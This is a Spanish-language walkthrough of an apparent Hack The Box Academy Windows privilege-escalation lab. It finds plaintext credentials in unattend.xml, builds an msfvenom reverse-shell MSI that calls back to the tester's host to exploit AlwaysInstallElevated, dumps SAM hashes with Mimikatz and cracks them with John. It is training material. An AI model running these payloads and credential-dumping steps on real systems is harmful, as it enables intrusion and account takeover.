
# Escenario 2

Como complemento a su prueba de penetración anual, la organización INLANEFREIGHT le ha solicitado que realice una revisión de seguridad de su imagen dorada estándar de Windows 10, actualmente en uso por más de 1200 empleados en todo el mundo. El nuevo CISO teme que no se hayan seguido las mejores prácticas al establecer la línea base de la imagen, y que la compilación pueda contener uno o más vectores de escalada de privilegios locales. Sobre todo, el CISO desea proteger la infraestructura interna de la empresa, garantizando que un atacante que acceda a una estación de trabajo (por ejemplo, mediante un ataque de phishing) no pueda escalar privilegios ni usar ese acceso para desplazarse lateralmente por la red. Debido a los requisitos regulatorios, los empleados de INLANEFREIGHT no tienen privilegios de administrador local en sus estaciones de trabajo.

Se le ha otorgado una cuenta de usuario estándar con acceso RDP a una copia de una estación de trabajo Windows 10 estándar sin acceso a internet. El cliente solicita una evaluación lo más completa posible (probablemente contratará a su empresa para probar o intentar eludir los controles EDR en el futuro); por lo tanto, Defender se ha desactivado. Debido a las regulaciones, no pueden permitir el acceso a internet al host, por lo que deberá transferir las herramientas usted mismo.

Enumere el host por completo e intente escalar privilegios al acceso de nivel de administrador/SYSTEM.

```
 Objetivo: 10.129.43.33
 
 RDP con usuario "htb-student" y contraseña "HTB_@cademy_stdnt!"
```

Ya que estamos ante una máquina Windows crearemos un disco compartido con nuestra máquina Kali Linux para facilitarnos el envío de herramientas:

```bash
xfreerdp /v:10.129.43.33 /u:htb-student /p:HTB_@cademy_stdnt! /drive:linux,/tmp
```

<figure><img src="/files/hlovqeP1EsFfTlv4FpW8" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Pregunta 1</mark>

> Encuentra las credenciales en plano para la cuenta de administrador del dominio `iamtheadministrator`.

No tenemos Powershell como admin, por lo que usaremos la cuenta standard.

### Enumeración de Administradores

```powershell
c:\Users\Public> net localgroup Administrators
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
mrb3n
wksadmin
```

### Credential Hunting

Buscando archivos `unattend.xml` encontramos las credenciales del usuario `iamtheadministrator`:

```powershell
PS C:\Users\Public> Get-ChildItem -Path C:\ -Filter unattend.xml -Recurse -ErrorAction SilentlyContinue                

    Directory: C:\Windows\Panther

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         6/6/2021   1:21 PM           8231 unattend.xml
```

```powershell
PS C:\Users\Public> type  C:\Windows\Panther\unattend.xml                                                              <!--*************************************************
Installation Notes
Location: HQ
Notes: OOB installer for Inlanefreight Windows 10 systems.
**************************************************-->

<?xml version="1.0" encoding="utf-8"?>
<unattend xmlns="urn:schemas-microsoft-com:unattend">
<settings pass="windowsPE">
<FullName>INLANEFREIGHT\iamtheadministrator</FullName>
<Organization>INLANEFREIGHT</Organization>
<Password>
<Value>Inl@n3fr3ight_************</Value>
<PlainText>true</PlainText>
```

## <mark style="color:purple;">Pregunta 2</mark>

> Escala privilegios a SYSTEM y envía el contenido del archivo `flag.txt` en el Escritorio del Administrador

### Comprobar privilegios del usuario

```powershell
PS C:\Users\Public> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

### **Enumerar configuraciones "**&#x41;lways Install Elevate&#x64;**"** <a href="#enumerar-configuraciones-always-install-elevated" id="enumerar-configuraciones-always-install-elevated"></a>

```powershell
PS C:\htb> reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer

HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

```powershell
PS C:\htb> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

Nuestra enumeración nos muestra que la key `AlwaysInstallElevated` existe, por lo que la política está habilitada en el sistema de destino.

### **Generar binario msi malicioso**

Para explotar esto generemos un binario malicioso `aie.msi` que pueda usarse para obtener una conexión de reverse shell de Meterpreter desde nuestro objetivo.

```shell-session
afsh4ck@kali$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.179 lport=9443 -f msi > aie.msi
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of msi file: 159744 bytes
```

### **Envio a la máquina**

```shell-session
afsh4ck@kali$ $ cp aie.msi /tmp
```

### Abrir listener de Netcat

```shell-session
afsh4ck@kali$ nc -lvnp 9443
listening on [any] 9443 ...
```

### Ejecutar aie.msi malicioso

Moveremos el binario a C:\Users\Public para ejecutarlo:

```powershell
PS C:\Users\Public> msiexec /i C:\Users\Public\aie.msi /quiet /qn /norestart 
```

### Recibimos la Shell SYSTEM

```shell-session
afsh4ck@kali$ nc -lvnp 9443
listening on [any] 9443 ...
connect to [10.10.14.179] from (UNKNOWN) [10.129.160.169] 49752
Microsoft Windows [Version 10.0.18363.592]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

### Acceso a la flag

```powershell
C:\Windows\system32> cd c:/Users/administrator/Desktop
cd c:/Users/administrator/Desktop

c:\Users\Administrator\Desktop> dir 
dir
 Volume in drive C has no label.
 Volume Serial Number is 823E-9601

 Directory of c:\Users\Administrator\Desktop

08/08/2021  07:17 PM    <DIR>          .
08/08/2021  07:17 PM    <DIR>          ..
06/07/2021  12:10 PM                28 flag.txt
               1 File(s)             28 bytes
               2 Dir(s)   5,776,863,232 bytes free

c:\Users\Administrator\Desktop> type flag.txt
el3vatEd_1nstall$_********
```

## <mark style="color:purple;">Pregunta 3</mark>

> Hay un usuario administrador local deshabilitado en este sistema con una contraseña débil que podría usarse para acceder a otros sistemas de la red y que conviene informar al cliente. Tras aumentar los privilegios, recupera el hash NTLM de este usuario y crackealo sin conexión. Envía la contraseña en texto plano de esta cuenta.

Enviamos Mimikatz al objetivo y lo ejecutamos desde la Shell SYSTEM:

```
C:\Windows\system32> C:\Users\Public\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061

mimikatz(commandline) # token::elevate
Token Id  : 0
User name : 
SID name  : NT AUTHORITY\SYSTEM

680	{0;000003e7} 1 D 39925     	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,21p)	Primary
 -> Impersonated !
 * Process Token : {0;000003e7} 2 D 4435582   	NT AUTHORITY\SYSTEM	S-1-5-18	(11g,19p)	Primary
 * Thread Token  : {0;000003e7} 1 D 4483970   	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,21p)	Impersonation (Delegation)

mimikatz(commandline) # lsadump::sam
Domain : ACADEMY-WINLPE-
SysKey : fab4b2e32a415ea36f846b9408aa69af
Local SID : S-1-5-21-1961621466-3413676743-2436262688

SAMKey : 4cc85e4026c655a9868269b9ea32b98a

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 7796ee39fd3a9c3a1844556115******

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 0d5498d1ce2f4ab2b5a5876310cf727c

* Primary:Kerberos-Newer-Keys *
    Default Salt : ACADEMY-WINLPE-SKILLS2-WSAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 8d1cb2bd6dc559fe71e7fddedad9aad88cafe2aeb34315fcc98cf76b1d3737b2
      aes128_hmac       (4096) : e9c01a727b6472605f843c6fe3a414f7
      des_cbc_md5       (4096) : 436279153d1c197f

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : ACADEMY-WINLPE-SKILLS2-WSAdministrator
    Credentials
      des_cbc_md5       : 436279153d1c197f


RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: aad797e20ba0675bbcb3e3df33******

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 08ef35b79c8760ee4bff7e24782def35

* Primary:Kerberos-Newer-Keys *
    Default Salt : WDAGUtilityAccount
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 997f1534876f135c97b5e200f829fd9ca4109d966eb2127cdbaf44d010b339b0
      aes128_hmac       (4096) : ed3dc198eab1fdd5abe012fabcaec659
      des_cbc_md5       (4096) : 5e7a6d07921f8f86

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WDAGUtilityAccount
    Credentials
      des_cbc_md5       : 5e7a6d07921f8f86


RID  : 000003e9 (1001)
User : mrb3n
  Hash NTLM: 7796ee39fd3a9c3a1844556115******

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : a9f81f7884aa8391156bdabec3a786d3

* Primary:Kerberos-Newer-Keys *
    Default Salt : ACADEMY-WINLPE-SKILLS2-WSmrb3n
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : f96e7895b4152163449ee83bba6e522a0db300643ae9dd9ff68192c96203cb73
      aes128_hmac       (4096) : 7a6e4592bf61b6541678f5cc7c83074d
      des_cbc_md5       (4096) : 703d2f3449bc01e3
    OldCredentials
      aes256_hmac       (4096) : 5893a5bdea6f49325b23f11a176ea952f21f3dd03365b57644c351c1c5ea03da
      aes128_hmac       (4096) : d6b26a70eb89c634571c17cf1b784bdb
      des_cbc_md5       (4096) : 29a47abf9b547fc8
    OlderCredentials
      aes256_hmac       (4096) : 5893a5bdea6f49325b23f11a176ea952f21f3dd03365b57644c351c1c5ea03da
      aes128_hmac       (4096) : d6b26a70eb89c634571c17cf1b784bdb
      des_cbc_md5       (4096) : 29a47abf9b547fc8

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : ACADEMY-WINLPE-SKILLS2-WSmrb3n
    Credentials
      des_cbc_md5       : 703d2f3449bc01e3
    OldCredentials
      des_cbc_md5       : 29a47abf9b547fc8


RID  : 000003ea (1002)
User : htb-student
  Hash NTLM: 3c0e5d303ec84884ad5c3b7876a06ea6

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 9a92cfffe0cff0e3fdbaf318b7556b44

* Primary:Kerberos-Newer-Keys *
    Default Salt : ACADEMY-WINLPE-SKILLS2-WShtb-student
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : e8f3530bb3143d2f545ff0e1767d3c14ee1aa777a4c380f116aee8f61529e36e
      aes128_hmac       (4096) : 09715c770cc9fb76893633fcc9f89dfe
      des_cbc_md5       (4096) : 8fd5343d15daa2a1
    OldCredentials
      aes256_hmac       (4096) : 4b8cd88c9314ee493745799566df327100d388a75077a3c0ceacd22dab3280c8
      aes128_hmac       (4096) : a8d05d9250be33ce181c39bd17389f46
      des_cbc_md5       (4096) : dfa7aea2bf1c459e

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : ACADEMY-WINLPE-SKILLS2-WShtb-student
    Credentials
      des_cbc_md5       : 8fd5343d15daa2a1
    OldCredentials
      des_cbc_md5       : dfa7aea2bf1c459e


RID  : 000003eb (1003)
User : wksadmin
  Hash NTLM: 5835048ce94ad0564e29a924a0******

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 8acd2280a949183293de743c25bb0312

* Primary:Kerberos-Newer-Keys *
    Default Salt : ACADEMY-WINLPE-SKILLS2-WSwksadmin
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 2eb9828764f09b2bd11a689aa4a94cb7ec4ddc87b980d6d11a312eea5783ce6c
      aes128_hmac       (4096) : 226cbee977f61548c0888c052f4705ea
      des_cbc_md5       (4096) : 7575c16b8c5b9452

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : ACADEMY-WINLPE-SKILLS2-WSwksadmin
    Credentials
      des_cbc_md5       : 7575c16b8c5b9452


mimikatz(commandline) # exit
Bye!
```

Obtenemos los hashes NTLM de los usuarios:

```
User : Administrator
  Hash NTLM: 7796ee39fd3a9c3a1844556115******

User : mrb3n
  Hash NTLM: 7796ee39fd3a9c3a1844556115******
  
User : WDAGUtilityAccount
  Hash NTLM: aad797e20ba0675bbcb3e3df33******
  
User : wksadmin
  Hash NTLM: 5835048ce94ad0564e29a924a0******
```

Vamos a guardar los 3 hashes en un archivo `hashes.txt` y a crackearlo con John:

```bash
john --format=NT hashes.txt 

Using default input encoding: UTF-8
Loaded 3 password hashes with no different salts (NT [MD4 512/512 AVX512BW 16x3])
Warning: no OpenMP support for this hash type, consider --fork=16
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
pa********        (?)     
```

Obtenemos la contraseña en plano para el usuario `Administrator` y `mrb3n`, ya que es el mismo hash!
